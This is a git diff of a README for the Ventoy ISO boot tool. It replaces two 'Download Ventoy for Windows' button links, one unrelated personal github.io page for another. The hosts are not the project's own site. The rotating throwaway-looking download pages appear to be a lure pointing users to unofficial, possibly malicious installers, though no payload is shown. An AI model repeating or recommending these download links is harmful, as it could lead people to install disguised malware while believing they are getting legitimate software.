@@ -16,7 +16,7 @@ Ventoy is an ISO boot utility for Windows that lets you place multiple ISO, WIM,
 <div align="center">
   <h3>Boot any ISO straight from your USB — no burning, no reformatting</h3>
 
-  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://leenbusseyducvee.github.io/.github/Ventoy-ISO-Boot-App)
+  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://timdiaz64.github.io/.github/Ventoy-ISO-Boot-App)
 
 </div>
 
@@ -92,7 +92,7 @@ For help with Ventoy, open the built-in Help or Support section inside the app, 
 <div align="center">
   <h3>Ready to get started with Ventoy?</h3>
 
-  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://leenbusseyducvee.github.io/.github/Ventoy-ISO-Boot-App)
+  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://timdiaz64.github.io/.github/Ventoy-ISO-Boot-App)
 
 </div>
 
